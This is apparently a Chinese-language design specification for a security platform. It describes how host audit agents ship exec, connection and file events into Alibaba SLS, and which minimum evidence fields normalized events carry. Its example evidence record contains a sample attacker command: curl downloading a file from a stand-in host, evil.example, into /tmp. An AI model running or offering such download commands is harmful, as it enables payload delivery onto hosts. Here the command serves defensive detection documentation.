# Agent 采集链与 Evidence 字段规范

**语言：** [English](12-agent-collection-and-evidence-spec.md) | 简体中文（本文）

> 补充 [数据源资产设计.md](09-data-asset-design.zh-CN.md)  
> 说明 **secweaver-agent / audit-port-execmon 模块 → SLS** 的注册方式，以及 Skill 消费的 **evidence 最小字段**

---

## 一、Agent → SLS 采集链

### 1.1 为什么有两种 connector？

主机侧 exec/connect/file_op 数据经 **Agent 采集**，再 **写入 SLS**。平台侧因此出现两类连接器：

| 角色 | connector_type | 用途 | 是否用于 fetch 查询 |
|---|---|---|---|
| **采集描述** | `agent_stream` | 记录 Agent 装在哪、写到哪 | ❌ 不直接查 |
| **查询入口** | `sls` | 指定 project/logstore，拉日志 | ✅ fetch 走这里 |

**原则**：本节以 SLS 为例。DataAsset 绑定可查询的存储 Connector：直连 SLS 使用 `sls`，托管查询使用 `sls_proxy`，自建 ES 使用 `es`；`agent_stream` 只描述采集拓扑，不作为 fetch 查询入口。自建 ES 的完整流程见[公开接入指南](../src/tools/secweaver-agent/elasticsearch/README.zh-CN.md)。

`secweaver-agent` 顶层配置必须包含平台签发的 16 位 `enterprise_id`。统一输出层会把该字段强制写入每条原始 JSONL，供共享 SLS Logstore 做租户隔离；业务模块不能覆盖它。通过 `sls_proxy` 查询时该内部字段会在返回前删除，因此它不属于 Skill 消费的 Evidence 最小字段。

```text
┌──────────────────┐     JSONL      ┌─────────────┐     ingest      ┌──────────────┐
│ secweaver-agent  │ ──────────────▶│ 阿里云 SLS   │ ◀────────────── │ 其他采集源   │
│ audit 模块       │                │ logstore    │                 │ (WAF/SSH…)   │
└──────────────────┘                └──────┬──────┘                 └──────────────┘
        ▲                                  │
        │ agent_stream                     │ sls (fetch)
        │ (元数据)                         ▼
 conn-agent-web-01-exec              asset-secweaver-host-exec
                                     → conn-sls-secweaver-host-events
```

### 1.2 标准注册模式（三件套）

以 WEB-01 主机 exec 为例：

| 文件 | 类型 | 作用 |
|---|---|---|
| `connectors/conn-agent-web-01-exec.json` | `agent_stream` | Agent 名、主机、`sink_connector_id` |
| `connectors/conn-sls-secweaver-host-events.json` | `sls` | project、logstore=`host-exec` |
| `assets/asset-secweaver-host-exec.json` | `host_exec` | **connector_id → SLS**，非 agent |

**agent_stream 示例**（`conn-agent-web-01-exec.json`）：

```json
{
  "connector_id": "conn-agent-web-01-exec",
  "connector_type": "agent_stream",
  "credentials_ref": "vault://sls/security-readonly",
  "config": {
    "agent": "secweaver-agent",
    "module": "audit-port-execmon",
    "host": "web-01",
    "host_ip": "10.0.1.5",
    "sink": "sls",
    "sink_connector_id": "conn-sls-secweaver-host-events",
    "event_types": ["exec", "active_connect", "file_op"]
  }
}
```

**逻辑资产**（`asset-secweaver-host-exec.json`）只指向 SLS：

```json
{
  "asset_id": "asset-secweaver-host-exec",
  "asset_type": "host_exec",
  "connector_id": "conn-sls-secweaver-host-events",
  "query_template_ids": ["host_exec_by_host_time"]
}
```

connect / file_op 同理：

| asset_type | SLS logstore（示例） | query_template |
|---|---|---|
| `host_exec` | `host-exec` | `host_exec_by_host_time` |
| `host_connect` | `host-connect` | `host_connect_by_host_time` |
| `host_file_op` | `host-file-op` | `host_file_op_by_host_time` |

### 1.3 event_type 与 asset_type 映射

Agent 写入 SLS 的 JSON 应带 `event_type`，与逻辑资产对应：

| Agent event_type | asset_type | SLS 查询过滤（示例） |
|---|---|---|
| `exec` | `host_exec` | `event_type: exec and host: {host}` |
| `active_connect` | `host_connect` | `event_type: active_connect and host: {host}` |
| `file_op` | `host_file_op` | `event_type: file_op and host: {host}` |

一台主机、三种事件 → **三个逻辑资产 + 三个 SLS logstore**（或同一 logstore 用 `event_type` 区分，但 asset 仍按类型拆分）。

### 1.4 凭证与查询路径

- **采集**：Agent 模块写入本地 JSON Lines；Logtail、Filebeat 或部署选用的 shipper 负责写入目标存储。
- **写入**：shipper 使用目标 Project/Logstore 或 ES 索引范围内的写入身份；只读查询凭证不能承担写入。托管模式的采集授权由对应安装与交付配置提供。
- **查询**：DataAsset 使用独立的只读身份，沿 `asset.connector_id`（或 `connector_ids`）→ Connector → `credentials_ref` → SOPS 解密 → 查询。
- `agent_stream` 上的示例 `credentials_ref` 只是元数据引用，**fetch 不读取该 Connector，也不会据此给 shipper 配置写入授权**。真实写入凭证不能从公开查询样例复制。


```text
fetch(asset-secweaver-host-exec)
  → conn-sls-secweaver-host-events
  → vault://sls/security-readonly
  → template host_exec_by_host_time
  → evidence_bundles.host_exec[]
```

### 1.5 运维清单

1. 在目标主机部署 [secweaver-agent](../src/tools/secweaver-agent/README.zh-CN.md)，并启用 `audit-port-execmon` 模块
2. 配置 shipper 采集 Agent JSONL 并写入 SLS（project/logstore 与查询 Connector 一致），验证写入权限和真实事件
3. 注册 `agent_stream`（文档 + `sink_connector_id`）
4. 注册 `sls` connector + 三个（或按需）`host_*` asset
5. `python3 src/dataasset/validate.py` — agent 未被 asset 直接引用属 **正常**，但 `sink_connector_id` 必须存在

### 1.6 常见误区

| 误区 | 正确做法 |
|---|---|
| asset 绑定 `conn-agent-*` | asset 绑定 `conn-sls-*` |
| 实现 agent_stream fetch 驱动 | 使用目标存储的查询 Connector |
| 一个 asset 混 host_exec + connect | 按 asset_type 拆成多个 asset |
| 忘记在 SLS 打 `event_type` | 归一化时无法分流到 host_exec/connect |

### 1.7 与 SSH 直读（`ssh_file`）的关系

`ssh_auth` / `web_access_log` 在未接入 SLS 时，可注册 **`ssh_file` 连接器** 直读单主机日志（见 [数据源资产设计.md §3.6](09-data-asset-design.zh-CN.md)）。

| 路径 | asset 绑定 | fetch 实现 |
|---|---|---|
| Agent → SLS | `conn-sls-*` | GetLogs |
| SSH 直读 | `conn-ssh-*`（`ssh_file`） | paramiko + `grep \| tail` |

生产环境可按容量和运维条件选择 SLS 或自建 ES 汇聚。`ssh_file` 是日志读取方式，不能替代 Agent 的事件采集能力；若读取 Agent 已生成的 JSONL，仍需配置匹配的解析器、字段和查询模板，并验证时间窗与事件覆盖。

### 1.8 多 connector 聚合（同 asset_type 多源）

当同一 `asset_type` 需从**多个 logstore、多台 SSH 主机、或 SLS+SSH 混合**拉数时，在逻辑资产上使用 `connector_ids`（见 [数据源资产设计.md §2.2](09-data-asset-design.zh-CN.md)）。

```text
asset-ssh-internal (ssh_auth)
  connector_ids:
    conn-sls-ssh-auth-internal      ← 全局汇聚 logstore（无 config.hostname）
    conn-sls-ssh-auth-web-01        ← 分 logstore，hostname=web-01
    conn-sls-ssh-auth-db-01         ← 分 logstore，hostname=db-01
    conn-ssh-web-01-auth            ← SSH 直读补充源
         │
         ▼ build_fetch_plan（每 connector 各选 template）
         ▼ fetch × N → normalizer → dedupe_by → evidence_bundles.ssh_auth[]
```

| 场景 | 注册方式 |
|---|---|
| 多 SLS logstore（每主机一个 store） | 每 store 一个 `conn-sls-*`，`config.hostname` 标注；一个 asset + `connector_ids` |
| SLS 汇聚 + 个别主机 SSH 直读 | `connector_ids` 混 sls + ssh_file；`query_template_ids` 含 SLS 与 SSH 模板 |
| Agent exec/connect | §1.2 的示例采用单存储汇聚；同一事件类型分布在多个存储时，也可使用 `connector_ids` |

**示例拓扑与运行时能力**：

- §1.2 为每种 Agent 事件类型配置一个逻辑资产，查询单个 SLS logstore，并通过查询模板过滤主机；这是示例部署方式，不是禁止多源聚合。
- `host_exec`、`host_connect` 与其他资产一样，可通过 `connector_ids` 指向多个可查询的存储 Connector。每个 Connector 都需有匹配的查询模板，结果归一到同一 `asset_type` 后合并去重；`agent_stream` 仍只描述采集拓扑，不能作为查询源。
- [build_fetch_plan](../src/skills/_shared/data-access/template_select.py) 为选中的 Connector 分别选择模板并生成查询计划。`connector_ids` 表示多源查询，不表示按顺序主备切换。

**host 参数选源**：当前 [filter_connectors_by_host](../src/skills/_shared/data-access/aggregate.py) 按 `config.hostname` 选择 Connector，行为如下：

| 条件 | 保留的 Connector |
|---|---|
| 未指定 `params.host` | 原 Connector 列表 |
| 至少一个 `config.hostname` 与 `params.host` 匹配 | 所有匹配项，再加未配置 hostname 的全局源 |
| 没有任何 hostname 匹配（包括没有绑定 hostname 的情况） | 原 Connector 列表，不会只留下全局源或返回空列表 |

例如 `params.host=web-01`，而列表中只有绑定 `web-02`、`db-01` 的源和一个全局源时，三者都会保留在选源结果中；若另有绑定 `web-01` 的源，则只保留该匹配源与全局源。随后仍需匹配模板才能形成查询计划。

这是查询源选择逻辑，不是主机访问隔离。实际事件范围还取决于查询模板和后端过滤；部署时应验证模板中的主机与时间条件，访问权限由数据源侧独立控制。

**Evidence 字段**：归一化后每条 event 含 `_source_connector_id`（来源 connector），便于溯源 Skill 标注数据缺口。模板按 connector 类型分别选择，见 [query-templates/README.md](../dataasset/query-templates/README.md)。

```bash
python3 src/dataasset/test_connector.py asset-ssh-internal --by-asset --plan \
  --params '{"attacker_ip":"203.0.113.10","host":"web-01","time_start":"...","time_end":"..."}'
```

### 1.9 格式发现（新 log 类型接入）

仅处理 dataasset 中 **`status: discovery`** 的资产；draft / active / disabled **不经过**本流程。

```text
注册 asset（status=discovery）→ discover.py --asset-id → 大模型映射
         → 更新该 asset → discovery → draft → active → validate
```

```bash
python3 src/skills/log-format-discovery/scripts/discover.py --list-discovery
python3 src/skills/log-format-discovery/scripts/discover.py \
  --asset-id asset-waf-api-prod -i samples.jsonl --pretty
```

详见 [日志格式发现.md](../docs_user/20-log-format-discovery.zh-CN.md)、[日志格式发现设计.md](20-log-format-discovery-design.zh-CN.md)、[SKILL.md](../src/skills/log-format-discovery/SKILL.md)。

---

## 二、Evidence 最小字段规范

### 2.1 目标

Data Access Layer 从 SLS/SSH/DB 拉回原始日志后，须归一化为 Skill 可消费的 **evidence event**。  
本规范定义 **最小必填字段**；Normalizer（`fetch` 之后）负责补齐 `evidence_id`、统一 `timestamp`。

### 2.2 总体结构

Skill 输入中的证据容器：

```json
{
  "evidence_bundles": {
    "waf_alert": [ { "...": "..." } ],
    "host_exec": [ { "...": "..." } ]
  }
}
```

告警确认额外使用：

```json
{
  "primary_alerts": [ { "...": "..." } ],
  "correlated_evidence": {
    "web_access_log": [],
    "host_exec": [],
    "host_connect": [],
    "host_file_op": []
  }
}
```

- **键名** = `asset_type`（与 `dataasset/assets/*.json` 一致）
- **值** = 事件对象数组；无数据时用 `[]`，不要省略键

### 2.3 全类型通用字段

每条 evidence event **必须**有：

| 字段 | 类型 | 说明 |
|---|---|---|
| `evidence_id` | string | 平台生成，全局唯一，供 attack_chain `evidence_refs` 引用 |
| `timestamp` | string | ISO 8601，含时区，如 `2026-06-21T09:15:22+08:00` |

Normalizer 生成 `evidence_id` 建议格式：

```text
{asset_type_short}-{asset_id_hash}-{seq}
例：exec-asset-secweaver-host-exec-001
```

SLS 原始 `__time__` / Unix 秒须转换为 ISO `timestamp`。

### 2.4 分类型最小字段

#### `waf_alert`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `src_ip`, `timestamp`, `url`, `action` | 告警确认 P0 |
| 强烈建议 | `payload` 或 `request_body` | 无则最高 `suspicious` |
| 建议 | `rule_id`, `rule_name`, `host`, `method` | 溯源/分类 |

#### `web_access_log`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `src_ip`, `timestamp`, `url`, `status` | |
| 建议 | `method`, `user_agent`, `host` | |

#### `host_exec`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `host`, `timestamp`, `command` | `command` 可为 string 或 string[] |
| 强烈建议 | `event_type` = `"exec"` | Agent 源数据 |
| 建议 | `listener_port`, `listener_process`, `cwd`, `user`, `pid` | 风险识别 / 溯源 |

#### `host_connect`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `host`, `timestamp`, `dst_ip`, `dst_port` | |
| 强烈建议 | `event_type` = `"active_connect"` | |
| 建议 | `pid`, `src_ip` | |

#### `host_file_op`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `host`, `timestamp`, `path`, `action` | action: create/delete/write/… |
| 强烈建议 | `event_type` = `"file_op"` | |
| 建议 | `pid` | |

#### `ssh_auth`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `host`, `timestamp`, `src_ip`, `user`, `result` | result: Accepted/Failed 等 |
| 建议 | `auth_method`, `port` | |

#### `firewall_log`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `timestamp`, `src_ip`, `dst_ip`, `action` | allow/deny 等 |
| 建议 | `src_port`, `dst_port`, `protocol` | |

#### `network_traffic_audit`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `timestamp`, `src_ip`, `dst_ip`, `protocol` | TCP/UDP/ICMP 等 |
| 强烈建议 | `src_port`, `dst_port` | 五元组关联 |
| 建议 | `bytes`, `packets`, `application`, `session_id`, `duration`, `action` | L7 协议、外传体量、会话聚合 |

#### `asset_inventory`

| 优先级 | 字段 | 说明 |
|---|---|---|
| 必填 | `hostname`, `ip` | CMDB 单行 |
| 建议 | `zone`, `owner`, `services`, `environment` | |

#### `dns_log` / `ids_alert` / `db_audit` / 其他

扩展时在 `dataasset/configure/evidence-minimum-fields.json` 追加；最小集：`evidence_id` + `timestamp` + 该类型 `schema.correlation_keys` 中至少一项。

### 2.5 primary_alerts（告警确认专用）

`primary_alerts[]` 可不含 `evidence_id`，但须含：

| 字段 | 说明 |
|---|---|
| `alert_id` | 业务告警 ID |
| `timestamp` | 告警时间 |
| `src_ip` | 攻击源 |
| `url` | 请求路径 |
| `action` | blocked/logged 等 |
| `payload` 或等价请求体 | 第二层 success 研判依赖 |

建议：`source`（waf/ids）、`rule_id`、`rule_name`、`host`、`method`。

### 2.6 归一化职责（Normalizer）

fetch 层在返回 Skill 之前由 **`normalizer.py`** 执行（已实现）：

```text
1. 按 asset.asset_type 分组 → evidence_bundles 键
2. 每条事件写入 evidence_id（若缺失）
3. timestamp 统一 ISO 8601
4. 字段别名映射（见下表）
5. 按 asset.masking 截断敏感字段（如 payload truncate_500）
6. 不写入 credentials、原始 AK、完整 DSN
```

**常见别名映射**：

| 原始（SLS/源） | 归一化 |
|---|---|
| `__time__` / `@timestamp` | `timestamp`（ISO） |
| `client_ip` / `remote_addr` | `src_ip` |
| `request_uri` | `url` |
| `cmd` / `argv` | `command` |
| `dest_ip` | `dst_ip` |

### 2.7 完整示例（归一化后）

```json
{
  "evidence_bundles": {
    "host_exec": [
      {
        "evidence_id": "exec-001",
        "event_type": "exec",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "listener_port": 443,
        "listener_process": "nginx",
        "command": ["curl", "-o", "/tmp/x", "http://evil.example/x"],
        "cwd": "/var/www/html"
      }
    ]
  },
  "query_meta": {
    "asset_id": "asset-secweaver-host-exec",
    "rows_returned": 1,
    "truncated": false
  }
}
```

### 2.8 与 dataasset schema 的关系

| 位置 | 内容 |
|---|---|
| `assets/*.json` → `schema.fields` | 声明资产**可能有哪些列**（完整性 Skill） |
| 本文 / `evidence-minimum-fields.json` | 声明 fetch 后**至少要有哪些列**（Skill 研判） |
| `schema.correlation_keys` | **已废弃**；由 `correlation-matrix` + `schema.fields` 自动推导（`correlation_keys.py`） |

完整性分析看 **registered_assets.fields**；溯源/告警看 **evidence 是否满足本节最小集**。

### 2.9 校验

`validate.py` 当前校验 JSON 引用；evidence 字段合规可在 Normalizer 实现后增加：

```bash
# 规划中的扩展
python3 src/dataasset/validate.py --check-evidence sample.json
```

---

## 三、相关文件

| 文件 | 说明 |
|---|---|
| [src/tools/secweaver-agent/README.zh-CN.md](../src/tools/secweaver-agent/README.zh-CN.md) | 统一 Agent 部署 |
| [src/tools/secweaver-agent/audit-port-execmon.example.json](../src/tools/secweaver-agent/audit-port-execmon.example.json) | audit-port-execmon 模块配置示例 |
| [dataasset/connectors/conn-agent-web-01-exec.json](../dataasset/connectors/conn-agent-web-01-exec.json) | agent_stream 示例 |
| [dataasset/configure/evidence-minimum-fields.json](../dataasset/configure/evidence-minimum-fields.json) | 机器可读最小字段 |
| [src/skills/traceability-analysis/scripts/input.example.json](../src/skills/traceability-analysis/scripts/input.example.json) | 手工 evidence 样例 |

---

*文档版本：v1.2 | 更新日期：2026-09-16*
